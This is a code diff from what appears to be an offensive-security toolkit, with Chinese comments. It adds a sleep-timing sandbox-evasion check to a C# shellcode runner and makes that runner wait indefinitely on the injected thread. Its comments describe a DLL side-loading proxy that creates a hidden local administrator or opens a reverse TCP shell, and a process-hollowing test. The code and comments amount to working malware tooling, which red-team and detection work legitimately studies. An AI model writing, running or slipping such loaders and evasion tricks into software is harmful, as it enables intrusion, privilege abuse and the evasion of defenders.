@@ -202,6 +202,9 @@ class Runner
     [DllImport("kernel32.dll", SetLastError = true)]
     private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
 
+    [DllImport("kernel32.dll")]
+    private static extern void Sleep(uint dwMilliseconds);
+
     private static byte[] Decode()
     {
         byte[] data = Convert.FromBase64String(SHELLCODE_B64);
@@ -211,6 +214,10 @@ class Runner
 
     public static void Run()
     {
+        DateTime t1 = DateTime.Now;
+        Sleep(2000);
+        if (DateTime.Now.Subtract(t1).TotalSeconds < 1.5) return;
+
         byte[] sc = Decode();
 
         const uint MEM_COMMIT_RESERVE = 0x3000;
@@ -233,7 +240,7 @@ class Runner
             return;
         }
 
-        WaitForSingleObject(h, 2000);
+        WaitForSingleObject(h, 0xFFFFFFFF);
     }
 
     public static void Main(string[] args)
@@ -402,7 +409,7 @@ if ($ProbeOnly) {
 | C | 进程空心化（Process Hollowing） | 是否在挂起/替换镜像阶段被终止 |
 
 ```bash
-# 参照 cheat sheet：C# Process Injection / DLL Shellcode Inject
+# 参照 速查笔记：C# Process Injection / DLL Shellcode Inject
 # 生成后先用无害 payload（弹出计算器或写文件）验证行为，再换真实 payload
 ```
 
@@ -1041,7 +1048,7 @@ __declspec(dllexport) void CALLBACK Run(HWND hwnd, HINSTANCE hinst,
  *
  * 用途：DLL 旁加载的"实弹"Proxy —— 转发保持宿主正常的同时执行载荷，
  *       支持两种编译期模式：
- *         MODE_NETUSER（默认）：创建本地管理员账号（cheat sheet "New Admin
+ *         MODE_NETUSER（默认）：创建本地管理员账号（速查笔记 "New Admin
  *                   with C" 路线），适合宿主以提升权限运行时；
  *         MODE_REVERSE：反连 TCP shell，适合普通用户权限拿到交互式会话。
  *       所有转发导出仍由 forward.def 提供（与 m04-proxy-dll-sideload.c 相同）。
@@ -1105,7 +1112,7 @@ __declspec(dllexport) void CALLBACK Run(HWND hwnd, HINSTANCE hinst,
 #define ADMIN_PASS L"PASS"
 #endif
 
-/* ---------- 模式一：创建本地管理员（cheat sheet: New Admin with C） ---------- */
+/* ---------- 模式一：创建本地管理员（速查笔记: New Admin with C） ---------- */
 
 static DWORD AddAdminUser(void)
 {
